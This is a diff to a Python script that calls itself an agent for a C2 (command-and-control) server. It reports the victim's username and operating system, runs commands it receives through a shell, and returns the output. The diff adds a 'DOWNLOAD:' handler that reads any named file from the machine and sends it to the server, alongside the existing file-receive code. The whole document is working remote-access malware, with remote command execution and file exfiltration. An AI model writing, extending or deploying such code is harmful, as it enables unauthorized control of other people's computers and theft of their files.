@@ -1,15 +1,18 @@
+import os
 import socket
 import subprocess
 import platform
 import getpass
 
+
 def execute_command(command):
     try:
-        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        output = subprocess.check_output(
+            command, shell=True, stderr=subprocess.STDOUT)
         return output.decode()
     except Exception as e:
         return str(e)
-    
+
 
 def save_received_file(data, file_name):
     try:
@@ -32,30 +35,39 @@ def main():
         print("\nConnected to C2 server as:", username)
         agent_socket.send(username.encode())
         agent_socket.send(client_os.encode())
-        
+
         while True:
             data = agent_socket.recv(4096).decode().strip()
 
             if not data:
                 continue
 
-            if data:
-                if data.startswith("CMD:"):
-                    command = data[len("CMD:"):]
+            if data.startswith("CMD:"):
+                command = data[len("CMD:"):]
 
-                    if command.lower() == "exit":
-                        break
+                if command.lower() == "exit":
+                    break
 
-                    output = execute_command(command)
-                    agent_socket.send(output.encode())
+                output = execute_command(command)
+                agent_socket.send(output.encode())
+            elif data.startswith("DOWNLOAD:"):
+                file_name = data[len("DOWNLOAD:"):]
+                if os.path.exists(file_name):
+                    with open(file_name, "rb") as f:
+                        file_data = f.read()
+                        agent_socket.send("FILE:".encode())
+                        agent_socket.send(file_data)
                 else:
-                    output = save_received_file(data, "received_file")
-                    agent_socket.send(output.encode())
-            
+                    agent_socket.send(f"File not found: '{file_name}'".encode())
+            else:
+                output = save_received_file(data, "received_file")
+                agent_socket.send(output.encode())
+
         print("\nClosing connection to C2 server")
         agent_socket.close()
     except Exception as e:
         print(f"\nError: {e}")
+
 
 if __name__ == "__main__":
     main()
